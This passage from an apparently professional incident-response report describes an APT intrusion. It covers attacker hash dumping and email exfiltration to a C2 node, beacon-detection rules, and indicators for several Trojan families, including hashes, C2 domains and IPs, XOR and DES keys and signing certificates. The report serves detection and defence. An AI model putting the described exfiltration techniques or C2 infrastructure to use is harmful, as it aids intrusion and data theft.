RAR \r password: \r 64740629. \r  \r This \r archive \r file \r contained \r the\npassword \r hash \r dump \r utility \r (PW.exe), \r which \r is \r executed \r against \r server \r XX16, \r hence \r the \r reason \r for \r establishing \r a\nnetwork \r connection \r (2) \r to \r that \r system. \r  \r The \r RAR \r utility \r (ntfre.exe) \r is \r then \r used \r to \r archive \r the \r collected \r emails. \r  \r The\ncontent \r of \r the \r RAR \r archive \r (~WRD00h.tmp) \r is \r hidden \r password \r protected \r with \r password **happyday** (-­‐hphappyday).\nThe \r rest \r of \r the \r commands \r are \r to \r cleanup \r (also \r 12, \r 13, \r 14). \r  \r The \r RAR \r file \r was \r uploaded \r successfully \r to \r the \r C2 \r node.\n\n###### 4.4 Parallel Detection with Security Analytics\n\nDuring \r the \r early \r stages \r of \r an \r intrusion \r the \r adversary \r is \r typically \r very \r busy \r performing \r tasks \r such \r as \r moving \r laterally \r to\nadditional \r systems \r on \r the \r network, \r dumping \r password \r hashes, \r mapping \r out \r the \r network, \r and \r stealing \r data. \r  \r After \r they\naccomplish \r this \r part \r of \r the \r mission, \r the \r C2 \r channels \r will \r go \r quiet \r for \r the \r most \r part, \r by \r which \r we \r mean \r there \r maybe \r outbound\nconnection \r attempts \r but \r there \r is \r nothing \r on \r the \r destination \r node \r listening \r on \r that \r port. \r  \r Another \r symptom \r of \r this \r “quiet\ntime” \r is \r that \r the \r adversary \r may \r choose \r to \r park \r their \r domain \r names, \r by \r which \r we \r mean, \r that \r the \r domain \r names \r resolve \r to \r a\nlegitimate \r IP \r address \r such \r as \r a \r Google \r IP, \r or \r resolve \r to \r the \r loopback \r address, \r or \r some \r other \r non-­‐malicious \r IP. \r  \r The \r adversary\nmay \r occasionally \r interact \r with \r a \r system \r on \r the \r network \r to \r ensure \r that \r they \r still \r have \r access \r to \r the \r network, \r but \r the \r activity \r is\ntypically \r minimal. \r  \r The \r only \r exception \r to \r this \r behavior \r is \r if \r the \r adversary \r comes \r in \r for \r another \r round \r of \r data \r theft. \r  \r This\ncurrent \r case \r is \r a \r perfect \r example \r of \r this \r scenario, \r where \r at \r least \r one \r of \r the \r APT \r groups \r has \r had \r access \r to \r the \r network \r for \r at\nleast \r 3 \r years \r (since \r 2010).\n\nThis \r “quiet \r time” \r presents \r a \r challenge \r to \r signature \r based \r network \r devices, \r since \r there \r are \r no \r payloads \r to \r hit \r on. \r  \r RSA \r IR \r uses\na \r simple \r application \r rule \r within \r SA \r to \r identify \r suspected \r sessions \r in \r the \r form \r of \r TCP \r beaconing. \r  \r TCP \r beaconing \r is \r periodic\nattempts \r to \r create \r a \r TCP \r session \r with \r the \r Command \r and \r Control \r infrastructure.\n\n**Condition 1** **Condition 2**\n**ip.proto=6** **ip.proto=6**\n**streams=1** **streams=2**\n**risk.info='flags_syn'** **risk.info='flags_syn'**\n**risk.info!='flags_ack'** **risk.info!='flags_psh'**\n**risk.info!='flags_psh'** **risk.info!='flags_fin'**\n**risk.info!='flags_fin'** **alert!='rfc1918_dst'**\n**risk.info!='flags_rst'** **payload=0**\n**alert!='rfc1918_dst'**\n\n**Table \r 1: \r SA \r beacon \r detection \r rules**\n\n|Condition 1|Condition 2|\n|---|---|\n|ip.proto=6 streams=1 risk.info='flags_syn' risk.info!='flags_ack' risk.info!='flags_psh' risk.info!='flags_fin' risk.info!='flags_rst' alert!='rfc1918_dst'|ip.proto=6 streams=2 risk.info='flags_syn' risk.info!='flags_psh' risk.info!='flags_fin' alert!='rfc1918_dst' payload=0|\n\n\n-----\n\nRSA \r Incident \r Response Page \r 27\n\nThe \r first \r condition \r would \r appear \r when \r the \r remote \r listener \r is \r not \r listening \r on \r that \r port. \r  \r There \r could \r be \r any \r number \r of\nreasons \r for \r this \r such \r as \r an \r HTRAN[10] \r listener \r has \r been \r shut \r down \r or \r the \r Trojan \r server \r component \r itself \r has \r been \r shut \r down.\nThe \r packets \r generally \r follow \r the \r 3, \r 6, \r N \r periodicity. \r  \r This \r means \r that \r the \r first \r SYN \r packet \r is \r sent, \r 3 \r seconds \r later \r the \r second\nSYN \r packet \r is \r sent \r and \r 6 \r seconds \r later \r the \r 3[rd] \r SYN \r packet \r is \r sent. \r  \r N \r stands \r for \r the \r Trojan’s \r internal \r timer \r for \r attempting\nanother \r connection.\n\n**Figure \r 46 \r Suspicious \r TCP \r Beaconing**\n\nThe \r second \r condition \r expects \r a \r response \r from \r the \r server, \r but \r usually \r in \r the \r form \r of \r RST/ACK \r packets. \r  \r This \r would \r indicate \r a\nhost \r configuration \r that \r resets \r TCP \r connections \r when \r a \r service \r isn’t \r bound \r to \r that \r TCP \r port.\n\n**Figure \r 47 \r Suspicious \r TCP \r Beaconing**\n\nThe \r domains \r for \r these \r TCP \r beaconing \r sessions \r can \r be \r determined \r by \r taking \r the \r destination \r IP \r address \r and \r looking \r for \r DNS\nsessions \r in \r alias.ip. \r  \r Alias.ip \r is \r populated \r by \r the \r Advanced \r DNS \r parser \r available \r through \r the \r Security \r Analytics \r Live \r content\ndistribution \r system. \r  \r This \r metadata \r is \r generated \r when \r a \r domain \r lookup \r results \r in \r a \r valid \r IP \r address. \r  \r A \r partial \r view \r of \r the\nmetadata \r on \r a \r DNS \r lookup \r for \r drometic.suroot.com \r is \r shown \r below:\n\n**Figure \r 48 \r IP.Alias \r Resolution \r for \r drometic.suroot.com**\n\nThe \r network \r traffic \r for \r Trojan.FF-­‐RAT \r was \r initially \r discovered \r with \r the \r following \r rule.\n\n  - service \r = \r 0\n\n  - lifetime \r = \r 50-­‐u\n\n  - tcp.dstport \r = \r 80,81,8000,8080,8443,443,53,21,22,23,10443,1080\n\n  - risk.info \r = \r 'flags_syn'\nThis \r rule \r looks \r for \r traffic \r that \r has \r not \r been \r identified \r by \r the \r Security \r Analytics \r Service \r parsers, \r has \r been \r established \r for \r more\nthan \r 50 \r seconds \r on \r well-­‐known \r ports \r as \r well \r as \r containing \r the \r TCP \r Flag \r SYN. \r  \r Security \r Analytics \r attempts \r to \r identify \r sessions\nbased \r on \r the \r layer \r 3 \r and \r layer \r 4 \r information \r such \r as \r IP \r address \r and \r source/destination \r ports. \r  \r Sessions \r that \r grow \r to \r over\n32MB \r or \r over \r 60 \r seconds \r in \r duration \r are \r declared \r a \r complete \r session \r and \r sent \r to \r the \r parser \r logic \r and \r written \r to \r disk. \r  \r Long\nTCP \r sessions \r or \r large \r downloads \r will \r leave \r session \r fragments \r in \r Security \r Analytics, \r so \r keying \r off \r of \r the \r TCP \r Flag \r SYN, \r we \r can\nfind \r the \r beginning \r of \r such \r sessions \r and \r reduce \r the \r amount \r of \r data \r the \r analyst \r has \r to \r inspect.\n\nThe \r payload \r discovered \r in \r these \r sessions \r contains \r encoded \r binary \r data \r with \r a \r single \r byte \r XOR \r key. \r  \r The \r XOR \r key \r was \r easy \r to\nderive \r from \r the \r traffic \r as \r it \r is \r exposed \r when \r XOR-­‐ing \r NULL \r bytes. \r  \r Applying \r this \r key \r to \r the \r payload \r data \r yielded \r a \r Global\nUnique \r Identifier \r (GUID).\n\n10\nhttp://www.secureworks.com/cyber-­‐threat-­‐intelligence/threats/htran/\n\n\n-----\n\nRSA \r Incident \r Response Page \r 28\n\n**Figure \r 49 \r FF-­‐RAT \r Encoded \r Beacon**\n\n**Figure \r 50 \r FF-­‐RAT \r Decoded \r Beacon**\n\nFurther \r analysis \r revealed \r more \r details \r about \r the \r structure \r of \r the \r payload \r and \r a \r FLEX \r XML \r parser \r was \r developed \r to \r aid \r in\ndiscovering \r more \r hosts \r infected \r with \r this \r variant \r of \r FF-­‐RAT.\n\n**Figure \r 51 \r FF-­‐RAT \r Detection \r Parser**\n\n\n**Figure \r 51 \r FF-­‐RAT \r Detection \r Parser**\n\n\n**Figure \r 50 \r FF-­‐RAT \r Decoded \r Beacon**\n\nFurther \r analysis \r revealed \r more \r details \r about \r the \r structure \r of \r the \r payload \r and \r a \r FLEX \r XML \r parser \r was \r developed \r to \r aid \r in\ndiscovering \r more \r hosts \r infected \r with \r this \r variant \r of \r FF-­‐RAT.\n\n\n-----\n\nRSA \r Incident \r Response Page \r 29\n\n#### 5. Trojan Families\n\nRSA \r IR \r identified \r eight \r Trojan \r families \r that \r were \r being \r used \r by \r one \r or \r more \r APT \r groups \r in \r this \r engagement. \r  \r This \r is \r a \r large\nnumber \r of \r variants \r for \r such \r a \r small \r network \r (~1500 \r Windows \r systems), \r however \r it \r shows \r what \r a \r big \r target \r this \r particular\nnetwork \r was \r to \r the \r various \r APT \r groups \r that \r had \r infiltrated \r it.\n\n###### 5.1 Trojan.Lurker\n\nRSA \r IR \r identified \r several \r malicious \r files \r that \r it \r refers \r to \r as **Trojan.Lurker \r and** **Trojan.Lurker2. \r  \r This \r Trojan \r allowed \r the**\nadversary \r to \r perform \r the \r following \r actions \r on \r the \r infected \r systems:\n\n1. Execute \r commands \r via \r cmd.exe\n2. Execute \r Files\n3. Upload/download \r files\n4. Traverse \r the \r file \r system\n5. Enumerate/terminate \r running \r processes.\n\nOne \r variant \r of \r this \r Trojan \r was \r UPX \r packed \r at \r 18,304 \r bytes \r whereas \r the \r second \r variant \r was \r not \r packed \r and \r was \r 48,000 \r bytes.\nThe \r primary \r method \r of \r entrenchment \r was \r by \r hijacking \r the \r NTMSSVC \r service \r by \r replacing \r the \r legitimate \r DLL \r name \r there\n(ntmssvc.dll) \r with \r one \r of \r the \r malicious \r files. \r  \r The \r characteristics \r of \r the \r discovered \r Trojans \r are \r shown \r below:\n\n**File Name** **Size** **MD5 Hash** **Compile Time** **C2 Nodes**\n```\n                                          price.nspok.com\n tpoaed.dll 18304 127D4ED81A3B107FC20A5B7F951D834B [Sep 07 2009 ] avail.nspok.com\n                                 03:15:30 UTC\n                                          202.181.133.97\n                                          220.232.228.11\n lpest.dll 18304 67595C3D126DFF2FEF1281D4EA0E8F45 [Sep 07 2009 ] avail.nspok.com\n                                 03:15:30 UTC\n                                          202.181.133.97\n                                          mafeng.mircbloger.com\n asesed.dll\n        18304 836910D7E9CA82AA28123293D2509935 [Sep 07 2009 ] avail.nspok.com\n vdeedd.dll 03:15:30 UTC\n                                          202.181.133.97\n                                          rolling.mircbloger.com\n powms.dll 18304 1FA362F7611AA30E7DFF1997E3067184 [Sep 07 2009 ] avail.nspok.com\n                                 03:15:30 UTC\n                                          202.181.133.97\n                                          No C2 channels.\n ntmcsvc.dll 18304 3B8134528C6B9655639B55708A899CDB [Sep 07 2009 ]\n                                 03:15:30 UTC Misconfigured Trojan.\n                                          update01.microsoft ntmrsvc.dll 48000 F96D9B121ECCD2C5EBDCD69DCDD6D8D3 [Dec 11 2011 ]\n                                 05:12:56 UTC centre.com\n                                          update01.microsoft ntmrsvc.dll 48000 DE0B3E40B369E025822817F0D54D811E [Dec 11 2011 ]\n                                 05:12:56 UTC centre.com\n\n```\n**Table \r 2: \r Trojan.Lurker \r files \r details \r and \r C2 \r channels**\n\nBoth \r variants \r of \r this \r Trojan \r contained \r configuration \r data \r encrypted \r at \r the \r end \r of \r the \r file. \r  \r Analysis \r shows \r that \r the \r data \r is\nencrypted \r using \r a \r modified \r version \r of \r the \r DES \r (ECB) \r algorithm. \r  \r The \r same \r key \r is \r also \r used \r to \r encrypt \r all \r network\ncommunication. \r  \r Between \r the \r two \r variants \r that \r were \r discovered \r two \r DES \r keys \r were \r found:\n\n**Figure \r 52: \r Trojan.Lurker \r -­‐ \r DES \r keys \r used \r by \r each \r variant**\n\n|File Name|Size|MD5 Hash|Compile Time|C2 Nodes|\n|---|---|---|---|---|\n|tpoaed.dll|18304|127D4ED81A3B107FC20A5B7F951D834B|Sep 07 2009 03:15:30 UTC|price.nspok.com avail.nspok.com 202.181.133.97|\n|lpest.dll|18304|67595C3D126DFF2FEF1281D4EA0E8F45|Sep 07 2009 03:15:30 UTC|220.232.228.11 avail.nspok.com 202.181.133.97|\n|asesed.dll vdeedd.dll|18304|836910D7E9CA82AA28123293D2509935|Sep 07 2009 03:15:30 UTC|mafeng.mircbloger.com avail.nspok.com 202.181.133.97|\n|powms.dll|18304|1FA362F7611AA30E7DFF1997E3067184|Sep 07 2009 03:15:30 UTC|rolling.mircbloger.com avail.nspok.com 202.181.133.97|\n|ntmcsvc.dll|18304|3B8134528C6B9655639B55708A899CDB|Sep 07 2009 03:15:30 UTC|No C2 channels. Misconfigured Trojan.|\n|ntmrsvc.dll|48000|F96D9B121ECCD2C5EBDCD69DCDD6D8D3|Dec 11 2011 05:12:56 UTC|update01.microsoft- centre.com|\n|ntmrsvc.dll|48000|DE0B3E40B369E025822817F0D54D811E|Dec 11 2011 05:12:56 UTC|update01.microsoft- centre.com|\n\n\n-----\n\nRSA \r Incident \r Response Page \r 30\n\n###### 5.2 Trojan.SurperhardCorp\n\nRSA \r IR \r identified \r a \r Trojan \r family \r that \r it \r refers \r to \r as \r Trojan.SuperhardCorp. \r  \r This \r Trojan \r allows \r the \r adversary \r to \r perform \r the\nfollowing \r actions \r on \r an \r infected \r system:\n\n1. Execute \r commands/files\n2. Upload/download \r files\n3. Traverse \r the \r file \r system\n4. Enumerate/terminate \r running \r processes.\n\nThe \r primary \r method \r of \r entrenchment \r for \r this \r Trojan \r was \r a \r service \r named \r IRMON. \r The \r Trojan \r communicates \r over \r TCP \r port\n443. \r  \r The \r characteristics \r of \r the \r discovered \r Trojans \r are \r shown \r below:\n\n**File Name** **Size** **MD5 Hash** **Compile Time** **C2 Nodes**\n```\n                                            appear.weibo03.com\n irmon.dll 788892 BE87882D1F306FB9E834FE683EE1A99A [Oct 25 2010 ]\n                                    07:31:08 UTC docume.sysbloger.com\n                                            ohio.sysbloger.com\n irmon32.dll 788992 16B2F029BC7BDE4C2EE69B65B323B86E [Oct 25 2010 ]\n                                    07:31:08 UTC specs.dnsrd.com\n                                            np3.Jkub.com\n AppMgmt32.dll 81408 928A2D849047FE1B733A473CFF2EC66C [Jan 20 2010 ]\n                                    05:20:33 UTC ns8.ddns1.com\n                                            books.mrface.com\n AppMgmt32.dll 769040 71AF8D680158C737ACF8304275F4CB2F [Oct 24 2010 ]\n                                    13:19:49 UTC kieti.ipsecsl.net\n\n```\n**Table \r 3: \r Trojan.SuperhardCorp \r file \r details \r and \r C2 \r channels**\n\nThe \r name \r of \r this \r Trojan \r comes \r from \r a \r string \r that \r is \r hardcoded \r in \r all \r of \r these \r samples. \r  \r Here \r is \r an \r example:\n\n**Figure \r 53: \r Trojan.SuperhardCorp \r -­‐ \r binary \r snippet**\n\n###### 5.3 Trojan.Derusbi\n\nRSA \r IR \r identified \r two \r variants \r of \r another \r Trojan \r family \r that \r it \r refers \r to \r as \r Trojan.Derusbi. \r  \r This \r Trojan \r allows \r the \r adversary \r to\nperform \r the \r following \r actions \r on \r an \r infected \r system:\n\n1. Execute \r commands/files\n2. Upload/download \r files\n3. Traverse \r the \r file \r system\n4. Enumerate/terminate \r running \r processes.\n\nBoth \r variants \r used \r the \r same \r C2 \r channel. \r  \r The \r characteristics \r of \r the \r discovered \r Trojans \r are \r shown \r below:\n\n**File Name** **Size** **MD5 Hash** **Compile Time** **C2 Nodes**\n```\n mstcpday.dat 166703 AF1746DD9985FE9B19D5036CF45C93F0 [Jan 19 2013 ]\n                                    12:31:39 UTC [had-one-job.com ]\n senseron.dll 87552 0E91F700DF34A2C3633CD49818FA3A61 [Aug 14 2012 ]\n                                    16:38:55 UTC [had-one-job.com ]\n\n```\n**Table \r 4: \r Trojan.Derusbi \r -­‐ \r file \r details \r and \r C2 \r channels**\n\nThe \r first \r variant \r (mstscpday.dat) \r exports \r function \r DllRegisterServer, \r so \r it \r can \r be \r installed \r by \r simply \r calling \r it \r with \r the\nregsvr32.exe. \r  \r During \r it \r installation, \r the \r Trojan \r entrenched \r itself \r as \r a \r service \r named: **stisvc, \r and \r created \r a \r driver \r which \r it**\n\n|File Name|Size|MD5 Hash|Compile Time|C2 Nodes|\n|---|---|---|---|---|\n|irmon.dll|788892|BE87882D1F306FB9E834FE683EE1A99A|Oct 25 2010 07:31:08 UTC|appear.weibo03.com docume.sysbloger.com|\n|irmon32.dll|788992|16B2F029BC7BDE4C2EE69B65B323B86E|Oct 25 2010 07:31:08 UTC|ohio.sysbloger.com specs.dnsrd.com|\n|AppMgmt32.dll|81408|928A2D849047FE1B733A473CFF2EC66C|Jan 20 2010 05:20:33 UTC|np3.Jkub.com ns8.ddns1.com|\n|AppMgmt32.dll|769040|71AF8D680158C737ACF8304275F4CB2F|Oct 24 2010 13:19:49 UTC|books.mrface.com kieti.ipsecsl.net|\n\n|File Name|Size|MD5 Hash|Compile Time|C2 Nodes|\n|---|---|---|---|---|\n|mstcpday.dat|166703|AF1746DD9985FE9B19D5036CF45C93F0|Jan 19 2013 12:31:39 UTC|had-one-job.com|\n|senseron.dll|87552|0E91F700DF34A2C3633CD49818FA3A61|Aug 14 2012 16:38:55 UTC|had-one-job.com|\n\n\n-----\n\nRSA \r Incident \r Response Page \r 31\n\nloaded \r in \r memory \r and \r deleted \r from \r the \r file \r system. \r  \r The \r driver \r name \r is: \r C:\\WINDOWS\\system32\\Drivers\\{BC87739C-­‐6024-­‐\n412c-­‐B489-­‐B951C2F17000}.sys.\n\nThe \r second \r variant \r of \r this \r Trojan \r consist \r of \r two \r files: \r an \r executable \r file \r and \r a \r compressed \r configuration \r file. \r  \r This \r variant \r is\nentrenched \r as \r a \r service \r named \r SENS. \r The \r configuration \r file \r named \r seclogon.nls \r is \r compressed \r with \r the \r aPACK[11] \r algorithm:\n\n**Figure \r 54: \r Trojan.DerusbiAP32 \r -­‐ \r configuration \r file**\n\nWe \r can \r use \r decompress \r this \r file \r using \r utility \r appack.exe \r (390A7337B163B819CB99EABE0E8825A4) \r available \r at\nhttp://www.ibsensoftware.com/index.html. \r  \r The \r decompressed \r data \r is \r 1388 \r bytes \r (mostly \r NULLs). \r The \r relevant \r data \r is \r shown\nbelow:\n\n###### 5.4 Trojan.HiKiT\n\nRSA \r IR \r identified \r two \r malicious \r files \r that \r belong \r to \r a \r Trojan \r family \r that \r RSA \r IR \r refers \r to \r as \r Trojan.HiKit. \r This \r Trojan \r consists \r of\ntwo \r files: \r an \r executable \r file, \r and \r a \r configuration \r file. \r  \r The \r characteristics \r of \r the \r discovered \r Trojans \r are \r shown \r below:\n\n**File Name** **Size** **MD5 Hash** **Compile Time** **C2 Nodes**\n```\n svchost.exe 177664 7D4F241428A2496142DF1C4A376CEC88 [Feb 27 2012 ]\n                                    07:13:30 UTC [206.205.82.9 ]\n netddesrv.exe 177664 A5F07E00D3EEF7A16ECFEC03E94677E3 [Feb 27 2012 ]\n                                    07:13:30 UTC  [drometic.suroot.com ]\n\n```\n**Table \r 5: \r Trojan.Hikit \r -­‐ \r file \r details \r and \r C2 \r channels**\n\nThe \r configuration \r file \r named \r svchost.conf \r is \r obfuscated \r via \r a \r 4-­‐byte \r XOR \r key. \r  \r The \r first \r four \r bytes \r of \r the \r file \r reveal \r the \r key. \r  \r In\nthis \r case \r the \r key \r was: \r 0xFA2738CD. \r  \r The \r plaintext \r configuration \r data \r is \r shown \r below, \r the \r data \r in \r red \r was \r removed \r as \r it\nreferenced \r the \r victim.\n\n11\nhttp://www.ibsensoftware.com/index.html\n\n|File Name|Size|MD5 Hash|Compile Time|C2 Nodes|\n|---|---|---|---|---|\n|svchost.exe|177664|7D4F241428A2496142DF1C4A376CEC88|Feb 27 2012 07:13:30 UTC|206.205.82.9|\n|netddesrv.exe|177664|A5F07E00D3EEF7A16ECFEC03E94677E3|Feb 27 2012 07:13:30 UTC|drometic.suroot.com|\n\n\n-----\n\nRSA \r Incident \r Response Page \r 32\n\n**Figure \r 55: \r Trojan.Hikit \r deobfuscated \r configuration \r file**\n\nThe \r second \r configuration \r file \r was \r obfuscated \r with \r XOR \r key: \r 0xCE6C2B25. \r  \r The \r file \r had \r these \r characteristics:\n```\n  File Name: netddesrv.conf\n  File Size: 456 bytes\n  MD5:    d7367b3216856cef704e271034e237b5\n  SHA1:    d9ccbcab076e68a9f0f9a25697a07539397f8c95\n\n###### 5.5 Trojan.FF-RAT\n\n```\nRSA \r IR \r discovered \r several \r files \r that \r belong \r to \r a \r Trojan \r family \r that \r RSA \r IR \r refers \r to \r as \r Trojan.FF-­‐RAT. \r  \r Many \r of \r the \r discovered\nfiles \r have \r been \r legitimately \r digitally \r signed. \r  \r On \r certain \r systems, \r Trojan.FF-­‐RAT \r also \r contained \r a \r keystroke \r logger \r and \r a \r driver\nfile. \r  \r Here \r are \r some \r artifacts \r regarding \r this \r Trojan:\n\n1. This \r Trojan \r consisted \r of \r at \r least \r a \r DLL \r file \r (which \r always \r had \r a \r .dat \r extension) \r and \r a \r configuration \r file, \r which \r was\n\nalways \r found \r under: \r C:\\Windows\\Media\\Windows \r Config.wav. \r  \r Both \r 32bit \r and \r 64bit \r versions \r were \r deployed.\n2. The \r configuration \r file \r is \r obfuscated, \r and \r then \r decompressed. \r  \r See \r Apendix \r I \r for \r details \r on \r how \r to \r decrypt \r this \r file.\n3. On \r certain \r systems \r a \r driver \r named \r fstab.sys \r existed \r in \r memory \r only.\n4. The \r keystroke \r loggers \r were \r always \r named \r [RANDOM]_kl.dll, \r and \r a \r new \r file \r is \r created \r after \r each \r reboot. \r  \r The \r old \r files\n\nare \r not \r deleted. \r  \r The \r keystrokes \r are \r stored \r on \r a \r file \r named \r iismgr.dat, \r which \r was \r located \r in \r the \r same \r directory \r as\nthe \r DLL. \r  \r The \r data \r in \r the \r iismgr.dat \r is \r obfuscated \r via \r a \r single \r byte \r XOR \r key: \r 0xC2.\n\nAll \r digital \r certificates \r were \r issued \r by: \r Thawte \r Code \r Signing \r CA \r – \r G2. \r  \r The \r characteristics \r of \r the \r malicious \r files \r belonging \r to \r this\nTrojan \r family \r are \r shown \r below:\n\nTrojans \r with \r signer \r name: \r Xuzhou \r Chenji \r Technology \r Co.,Ltd\nCertificate \r Serial \r Number: \r 19ce1672107145e06fdc45fa2b753f0b\n\n**File Name** **Size** **MD5 Hash** **Compile Time** **Signing Time**\n```\n                                               May 13 2013 \n whwbedqu_kl.dll 116320 DB4A20526588360962703145C32E743E [Dec 03 2012 ]\n                                     08:20:05 UTC 1:25:22 AM\n                                               May 13 2013\n rmwpnwad_kl.dll 108128 5E287819699278CEFB490B0D7E768CED [Dec 03 2012 ]\n                                     08:18:42 UTC 1:25:24 AM\n nullods.dat 65464 8C3A13CFF4797A4E74988D05FDD8C287 [Dec 28 2012 ] Not available\n                                     07:59:48 UTC\n nullods.dat 169400 0CEB4CC3665E1190E0FA00FB7153AC22 [Dec 28 2012 ] Not available\n                                     07:59:18 UTC\n                                               Jan 09 2013 \n frtest.dat 172128 CC6999FB9174F2FE0564428EC7F92525 [Dec 28 2012 ]\n                                     07:59:18 UTC 4:19:33 AM\n                                               Jan 09 2013 \n frtest.dat 68192 C41A3CB0E7ACCA1AC434F65FB518E58B [Dec 28 2012 ]\n                                     07:59:48 UTC 4:19:15 AM\n Kqizbmwzopzbqva Sep 24 2012\n            204384 41ED24E665759992130BF4C08B5F532E [Jul 25 2012 ]\n g.kqi 06:41:30 UTC 10:10:57 AM\n\n```\n**Table \r 6: \r Trojan.FF-­‐RAT \r -­‐ \r file \r details**\n\n|File Name|Size|MD5 Hash|Compile Time|Signing Time|\n|---|---|---|---|---|\n|whwbedqu_kl.dll|116320|DB4A20526588360962703145C32E743E|Dec 03 2012 08:20:05 UTC|May 13 2013 1:25:22 AM|\n|rmwpnwad_kl.dll|108128|5E287819699278CEFB490B0D7E768CED|Dec 03 2012 08:18:42 UTC|May 13 2013 1:25:24 AM|\n|nullods.dat|65464|8C3A13CFF4797A4E74988D05FDD8C287|Dec 28 2012 07:59:48 UTC|Not available|\n|nullods.dat|169400|0CEB4CC3665E1190E0FA00FB7153AC22|Dec 28 2012 07:59:18 UTC|Not available|\n|frtest.dat|172128|CC6999FB9174F2FE0564428EC7F92525|Dec 28 2012 07:59:18 UTC|Jan 09 2013 4:19:33 AM|\n|frtest.dat|68192|C41A3CB0E7ACCA1AC434F65FB518E58B|Dec 28 2012 07:59:48 UTC|Jan 09 2013 4:19:15 AM|\n|Kqizbmwzopzbqva g.kqi|204384|41ED24E665759992130BF4C08B5F532E|Jul 25 2012 06:41:30 UTC|Sep 24 2012 10:10:57 AM|\n\n\n-----\n\nRSA \r Incident \r Response Page \r 33\n\nTrojans \r with \r signer \r name: \r Binzhou \r XinPin \r Technology \r Co.,Ltd.\nCertificate \r Serial \r Number: \r 391e363ec82ad7613db478c178180e8b\n\n**File Name** **Size** **MD5 Hash** **Compile Time** **Signing Time**\n```\n                                               Aug 28 2013\n rvtest.dat 181352 9985668A2F401A4EDE85918A5D417409 [Jul 10 2013 ]\n                                     05:36:44 UTC 9:43:57 PM\n                                               Jul 28 2013 \n frkeser.dat 181352 B76A3595523E6050C4034294257323CA [Jul 10 2013 ]\n                                     05:36:44 UTC 1:38:56 AM\n                                               Jul 28 2013 \n frkeser.dat 72296 939587C6CEB084273B424D982C52AC5A [Jul 10 2013 ]\n                                     05:36:27 UTC 1:38:01 AM\n                                               Jul 15 2013 \n fmconull.dat 181352 DB35A3A80BD62EFF91EAD4A2046D26A5 [Jul 10 2013 ]\n                                     05:36:44 UTC 2:31:46 AM\n                                               Jul 15 2013 \n fmconull.dat 72296 92E9F1FB37EE75415235C4E567DE0F1B [Jul 10 2013 ]\n                                     05:36:27 UTC 2:31:25 AM\n                                               Jul 15 2013 \n x8.txt 127592 838B97B916CA2A8A9855D8257A6826E7 [Jul 10 2013 ]\n                                     05:36:31 UTC 2:31:40 AM\n\n```\n**Table \r 7: \r Trojan.FF-­‐RAT \r -­‐ \r file \r details**\n\nTrojans \r with \r signer \r name: **Hangzhou \r Degou \r Information \r Technology \r Co.,Ltd.**\nCertificate \r Serial \r Number: \r 64477c85f26c2ca67d76468434263e0e\n\n**File Name** **Size** **MD5 Hash** **Compile Time** **Signing Time**\n```\n                                               Jan 16 2012\n bxevkwcb_kl 86192 90bfea7038a8a25e1e70ba76291b2016 [Jan 11 2012 ]\n                                     09:51:40 UTC 2:54:16 AM\n\n```\n**Table \r 8: \r Trojan.FF-­‐RAT \r -­‐ \r file \r details**\n\nTrojans \r with \r signer \r name: \r Henan \r Lvcheng \r Tianxia \r Information \r Technology \r Co.,Ltd\nCertificate \r Serial \r Number: \r 06b587cdb256cd4224baa55eb3ff2a98\n\n**File Name** **Size** **MD5 Hash** **Compile Time** **Signing Time**\n```\n                                               Aug 7 2012\n frtest.dat 191640 B8DF0D1A8EC15C40692D507E62F9EE80 [Mar 20 2012 ]\n                                     04:05:37 UTC 5:31:40 AM\n                                               May 31 2012\n frtest.dat 80096 705EBCFCE803D3FB69F409BABAF1376E [Mar 20 2012 ]\n                                     04:05:05 UTC 6:02:20 AM\n\n```\n**Table \r 9: \r Trojan.FF-­‐RAT \r -­‐ \r file \r details**\n\n**Unsigned \r Trojan.FF-­‐RAT \r files**\n\n**File Name** **Size** **MD5 Hash** **Compile Time** **Signing Time**\n```\n ngpqdasi_kl.dll 101376 071B2A2CF343A62EC7C75592362593BC [Dec 03 2012 ] N/A\n                                     08:18:42 UTC\n lcruhypy_kl.dll 109568 E36DA01D2C47C308CDA5AF49272F3FBD [Dec 03 2012 ] N/A\n                                     08:20:05 UTC\n fmnonull.dat 61440 B7F87AF5AFF0A68DE408B112A5A95049 [Dec 28 2012 ] N/A\n                                     07:59:48 UTC\n fmnonull.dat 165376 21C5FC01CED8B327A6AC1F31B90C525B [Dec 28 2012 ] N/A\n                                     07:59:18 UTC\n\n```\n**Table \r 10: \r Trojan.FF-­‐RAT \r -­‐ \r file \r details**\n\nAll \r the \r C2 \r domains \r related \r to \r this \r Trojan \r resolved \r to \r the \r same \r IP \r address \r 198.55.120.222 \r at \r the \r time \r of \r the \r engagement.\nOverall \r the \r following \r domain \r names \r were \r used \r by \r Trojan.FF-­‐RAT:\n\n**mno80.dwy.cc** **fan025.yahoolive.us** **pcal2.dwy.cc** **pcal2.yahoolive.us**\n**mno995.dwy.cc** **fan080.yahoolive.us** **3h01.dwy.cc**\n\n|File Name|Size|MD5 Hash|Compile Time|Signing Time|\n|---|---|---|---|---|\n|rvtest.dat|181352|9985668A2F401A4EDE85918A5D417409|Jul 10 2013 05:36:44 UTC|Aug 28 2013 9:43:57 PM|\n|frkeser.dat|181352|B76A3595523E6050C4034294257323CA|Jul 10 2013 05:36:44 UTC|Jul 28 2013 1:38:56 AM|\n|frkeser.dat|72296|939587C6CEB084273B424D982C52AC5A|Jul 10 2013 05:36:27 UTC|Jul 28 2013 1:38:01 AM|\n|fmconull.dat|181352|DB35A3A80BD62EFF91EAD4A2046D26A5|Jul 10 2013 05:36:44 UTC|Jul 15 2013 2:31:46 AM|\n|fmconull.dat|72296|92E9F1FB37EE75415235C4E567DE0F1B|Jul 10 2013 05:36:27 UTC|Jul 15 2013 2:31:25 AM|\n|x8.txt|127592|838B97B916CA2A8A9855D8257A6826E7|Jul 10 2013 05:36:31 UTC|Jul 15 2013 2:31:40 AM|\n\n|File Name|Size|MD5 Hash|Compile Time|Signing Time|\n|---|---|---|---|---|\n|bxevkwcb_kl|86192|90bfea7038a8a25e1e70ba76291b2016|Jan 11 2012 09:51:40 UTC|Jan 16 2012 2:54:16 AM|\n\n|File Name|Size|MD5 Hash|Compile Time|Signing Time|\n|---|---|---|---|---|\n|frtest.dat|191640|B8DF0D1A8EC15C40692D507E62F9EE80|Mar 20 2012 04:05:37 UTC|Aug 7 2012 5:31:40 AM|\n|frtest.dat|80096|705EBCFCE803D3FB69F409BABAF1376E|Mar 20 2012 04:05:05 UTC|May 31 2012 6:02:20 AM|\n\n|File Name|Size|MD5 Hash|Compile Time|Signing 